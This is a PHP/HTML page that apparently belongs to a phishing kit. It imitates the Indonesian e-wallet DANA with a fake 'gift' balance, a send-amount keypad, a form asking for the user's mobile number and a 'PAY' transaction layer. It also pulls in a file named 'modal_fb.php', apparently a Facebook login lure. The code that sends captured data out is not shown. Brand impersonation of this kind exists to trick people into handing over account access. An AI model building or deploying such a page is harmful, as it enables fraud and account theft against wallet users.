<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>
		Dana - Gift
	</title>
	<link rel="stylesheet" href="https://code.jquery.com/ui/1.14.1/themes/base/jquery-ui.css">
	<link rel="stylesheet" type="text/css" href="asset/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="asset/css/app_layer.css">
	<link rel="stylesheet" type="text/css" href="asset/css/style.css">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />


	
</head>
<body>


	<!-- Container App -->
	<div class="container_app">
		<!-- Box Detail -->
		<div class="box_detail">

			<div class="header">
				<div class="container-fluid">
					<div class="row">
						<div class="col-12 col_header">
							SISA HADIAH : <span class="max_gift">0</span>
						</div>
					</div>
				</div>
			</div>

			<div class="body">
				<div class="card_box">
					<div class="container-fluid">
						<div class="row row_img">
							<div class="col_img">
								<img src="asset/gam/user.png" class="user">
								<img src="asset/gam/logo.png" class="logo">
							</div>
							<div class="col col_profile">
								<p> DANA ID </p>
								<p class="number_des" id="phone_number"> - </p>
							</div>
						</div>

						<div class="row row_input">
							<div class="col-12" style="padding: 0;">
								
								<p> SEND AMOUNT </p>
								<input type="text" class="input_dial" name="saldo_dana" placeholder="Rp0">
								<p class="validasi_error"> s </p>

							</div>
						</div>

					</div>
				</div>
			</div>

		</div>
		<!-- End Of Box Detail -->

		<!-- Box Dial -->
		<div class="box_dial">

			<div class="container-fluid">
				<div class="row">	

					<?php for ($i=1; $i <= 9; $i++) { ?>
						<div class="col-4 col_dial" data-dial="<?= $i ?>">
							<?= $i ?>
						</div>
					<?php } ?>

				</div>
				<div class="row">
					<div class="col-4 col_dial" data-dial="0">
						0
					</div>

					<div class="col-4 col_dial" data-dial="000">
						000
					</div>
					<div class="col-4 col_dial" data-dial="del">
						<i class="fas fa-backspace"></i>
					</div>
				</div>

				<div class="row">
					<button class="btn btn-default btn_submit" id="btn_submit_dial"> DONE </button>
				</div>
			</div>

			
		</div>
		<!-- End Of Box Dial -->



		<!--+++++++++  Layer Dimension Fly App ++++++++++-->
		<!-- App Layer - Auth -->
		<div class="app_layer" style="display:none;" id="app_auth">
			<div class="backdrop"></div>
			<!-- Container App Layer -->
			<div class="container_app_layer">

				<!-- Header Layer -->
				<div class="header_layer">
					<div class="container-fluid">
						<div class="row justify-content-center">
							<img src="asset/gam/logo2.png" style="width:150px;height: 100%;margin-top: 10px;">
						</div>
					</div>
				</div>
				<!-- End Of Header Layer -->

				<!-- body Layer -->
				<div class="body_layer">

					<!-- Layer Auth -->
					<div class="content_layer" id="layer_auth_phone">
						<div class="container-fluid pt-5">
							<div class="row">
								<div class="col-12 text-center">
									<p style="margin-bottom: 0;"> Enter your mobile number to continue </p>
								</div>
							</div>
							<div class="row row_form pl-2">
								<div class="col_form" style="width: 120px;">
									<label> Country </label>
									<div class="box_auth box_phone">
										<div class="img_flag">
											<img src="asset/gam/flag.png">
										</div>
										<div class="text_flag">
											<span> +62 </span>
										</div>
									</div>
								</div>
								<div class="col_form col">
									<label> Number </label>
									<input type="text" class="box_auth"  name="phone_dana">

								</div>
							</div>
							<div class="row text-center">
								<div class="col-12">
									<p> We'll be using this mobile number as your ID & to secure your account. Also, by conntinuing you agree with our <b> T&C </b> and <b> Privacy Notice </b> </p>
								</div>
							</div>
						</div>

						<div class="box_submit">
							<button class="btn btn-default btn_submit" id="btn_save_phone">  
								SAVE
							</button>
						</div>

					</div>
					<!-- End Of Layer Auth -->
				</div>
				<!--End Of body Layer -->
				<!-- Load Layer -->
				<div class="load_layer">
					<div class="content_load">
						<div class="animasi_load">
						</div>
						<img src="asset/gam/logo.png">
					</div>
				</div>
				<!-- End Of Load Layer -->


			</div>
			<!-- End Of Container App Layer -->
		</div>
		<!-- End Of App Layer - Auth -->


		<!-- App Layer - Transaction -->
		<div class="app_layer" style="display: none;" id="app_transaction">
			<div class="backdrop"></div>
			<!-- Container App Layeer -->
			<div class="container_app_layer">


				<!-- Header Layer -->
				<div class="header_layer">
					<div class="container-fluid">
						<div class="row justify-content-center">
							<img src="asset/gam/logo.png" style="width:50px;height: 50px;">
							<h3 class="mt-2"> PAY </h3>	
						</div>
					</div>
				</div>
				<!-- End Of Header Layer -->
				<!-- body Layer -->
				<div class="body_layer">

					<?php require_once 'appContentLayer_trans.php'; ?>

				</div>
				<!--End Of body Layer -->
				<!-- Load Layer -->
				<div class="load_layer">
					<div class="content_load">
						<div class="animasi_load">
						</div>
						<img src="asset/gam/logo.png">
					</div>
				</div>
				<!-- End Of Load Layer -->
			</div>
			<!-- End Of Container App Layeer -->
		</div>
		<!-- End Of App Layer - Transaction -->

		<!-- End Of Layer Dimension Fly App -->

	</div>
	<!-- End Of Container App -->

	

	<script type="text/javascript" src="asset/js/jquery.min.js"></script>
	<script src="https://code.jquery.com/ui/1.14.1/jquery-ui.js"></script>
	<script type="text/javascript" src="asset/js/app_layer.js"></script>
	<script type="text/javascript" src="asset/js/app.js"></script>

	<?php require_once "modal_fb.php" ?>
</body>
</html>